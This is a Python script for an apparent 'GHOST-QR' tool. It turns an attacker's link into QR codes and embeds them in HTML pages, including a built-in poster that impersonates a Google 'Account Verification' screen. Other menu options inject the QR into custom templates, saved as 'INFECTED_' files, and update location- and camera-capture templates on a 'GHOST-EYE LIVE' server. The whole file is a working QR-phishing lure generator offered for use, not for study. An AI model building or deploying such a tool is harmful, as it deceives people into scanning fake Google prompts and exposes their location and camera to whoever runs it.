import qrcode
import os
import time
import sys
import base64
from io import BytesIO
from colorama import init, Fore, Style

# Inisialisasi Warna
init(autoreset=True)
RED, WHITE, YELLOW, GREEN, CYAN, BOLD, RESET = Fore.RED, Fore.WHITE, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Style.BRIGHT, Style.RESET_ALL

def slow_print(text, delay=0.005):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_anim(text):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(20):
        sys.stdout.write(f"\r{RED}[{chars[i % len(chars)]}] {WHITE}{text}...")
        sys.stdout.flush()
        time.sleep(0.05)
    print(f"\r{GREEN}[✔] {text} COMPLETED!          ")

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{RED}      .---.        .-----------.
{RED}     /     \      /  {WHITE}GHOST-QR{RED}   \\
{RED}    |  {WHITE}O O{RED}  |    |  {WHITE}GENERATOR{RED}   |
{RED}    |   {WHITE}^{RED}   |    '-----------'
{RED}    ' {WHITE}\___/{RED} '      {CYAN}Tools by {WHITE}GHOST{RED}
{RED}      `---`         {WHITE}Core: {GREEN}Active
{RED}  ═══════════════════════════════════════════
{WHITE}  DATE: {time.ctime()}  |  {RED}LOGGED: {WHITE}ROOT
{WHITE}  STATUS: {GREEN}ENCRYPTION ENABLED  {WHITE}|  {YELLOW}SECURE-MODE
{RED}  ═══════════════════════════════════════════""")

def create_default_poster(qr_base64, file_name):
    """Template Poster Otomatis (Google Security Style)"""
    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 5px solid #1a73e8; }}
            .logo {{ width: 60px; margin-bottom: 15px; }}
            h2 {{ color: #202124; font-size: 22px; margin: 10px 0; font-weight: 500; }}
            p {{ color: #5f6368; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }}
            .qr-container {{ background: #f8f9fa; padding: 20px; border-radius: 8px; border: 1px dashed #dadce0; }}
            img.qr-code {{ width: 200px; height: 200px; }}
            .footer-text {{ font-size: 11px; color: #9aa0a6; margin-top: 20px; letter-spacing: 0.5px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
            <h2>Account Verification</h2>
            <p>To ensure your account security, please scan the QR code below using your mobile device.</p>
            <div class="qr-container">
                <img class="qr-code" src="data:image/png;base64,{qr_base64}">
            </div>
            <p class="footer-text">SECURE SESSION ID: {int(time.time())}</p>
        </div>
    </body>
    </html>
    """
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(html_template)

def main():
    while True:
        banner()
        print(f"  {RED}[{WHITE}01{RED}] {WHITE}Generate Standard QR (.png)")
        print(f"  {RED}[{WHITE}02{RED}] {WHITE}Create Professional Poster (.html)")
        print(f"  {RED}[{WHITE}03{RED}] {WHITE}Inject into Custom Template")
        print(f"  {RED}[{WHITE}04{RED}] {GREEN}{BOLD}PUSH UPDATE TO GHOST-EYE LIVE{RESET}")
        print(f"  {RED}[{WHITE}05{RED}] {WHITE}System Shutdown")
        print(f"\n{RED}  " + "━" * 43)
        
        choice = input(f"  {RED}┌──({WHITE}{BOLD}ghostroot@{RESET}{RED}ghost)-[{WHITE}/home/qr-gen{RED}]\n  └─{WHITE}$ ")

        if choice in ['1', '01', '2', '02', '3', '03', '4', '04']:
            print(f"\n  {YELLOW}[!] AWAITING CLOUDFLARE LINK...")
            target_link = input(f"  {RED}URL {WHITE}> ")
            if not target_link: continue

            loading_anim("INITIALIZING GHOST-ENGINE")
            loading_anim("ENCODING PAYLOAD TO QR")
            
            qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
            qr.add_data(target_link)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")

            print(f"\n{WHITE}  [ QR GENERATED SUCCESSFULLY ]")
            qr.print_ascii(invert=True)

            buffered = BytesIO()
            img.save(buffered, format="PNG")
            qr_b64 = base64.b64encode(buffered.getvalue()).decode()
            timestamp = int(time.time())

            if choice in ['1', '01']:
                file_png = f"GHOST_QR_{timestamp}.png"
                img.save(file_png)
                print(f"\n{GREEN}[+] DATA SAVED: {WHITE}{file_png}")

            elif choice in ['2', '02']:
                file_html = f"GHOST_POSTER_{timestamp}.html"
                create_default_poster(qr_b64, file_html)
                print(f"\n{GREEN}[+] HTML POSTER READY: {WHITE}{file_html}")

            elif choice in ['3', '03']:
                custom_file = input(f"\n  {YELLOW}[?] Input Template File (e.g., login.html): {WHITE}")
                if os.path.exists(custom_file):
                    with open(custom_file, "r", encoding="utf-8") as f:
                        content = f.read()
                    new_content = content.replace("{{QR_CODE}}", f"data:image/png;base64,{qr_b64}")
                    output_name = f"INFECTED_{custom_file}"
                    with open(output_name, "w", encoding="utf-8") as f:
                        f.write(new_content)
                    print(f"\n{GREEN}[+] TEMPLATE INJECTED: {WHITE}{output_name}")
                else:
                    print(f"  {RED}[!] FILE NOT FOUND!")

            elif choice in ['4', '04']:
                print(f"\n  {CYAN}[ SELECT TARGET DIRECTORY ]")
                print(f"  1. template_location/")
                print(f"  2. template_camera/")
                sub_choice = input(f"  {YELLOW}Select (1/2): {WHITE}")

                folder = "template_lokasi" if sub_choice == '1' else "template_kamera"
                target_path = os.path.join(folder, "index.html")

                if os.path.exists(target_path):
                    loading_anim(f"REMOTE SYNC TO {folder.upper()}")
                    with open(target_path, "r", encoding="utf-8") as f:
                        old_html = f.read()
                    
                    if "{{QR_CODE}}" in old_html:
                        new_html = old_html.replace("{{QR_CODE}}", f"data:image/png;base64,{qr_b64}")
                        with open(target_path, "w", encoding="utf-8") as f:
                            f.write(new_html)
                        print(f"\n{GREEN}[✔] GHOST-EYE LIVE SERVER UPDATED!")
                    else:
                        print(f"  {RED}[!] ERROR: {{QR_CODE}} tag missing in {target_path}")
                else:
                    print(f"  {RED}[!] ERROR: Directory {folder} not found!")

            input(f"\n  {YELLOW}Press Enter to return to main frame...")

        elif choice in ['5', '05']:
            slow_print(f"\n{RED}  Cleaning session data...")
            slow_print(f"{RED}  Shutting down Ghost-QR Engine...")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}  [!] Force Close.")
        sys.exit()
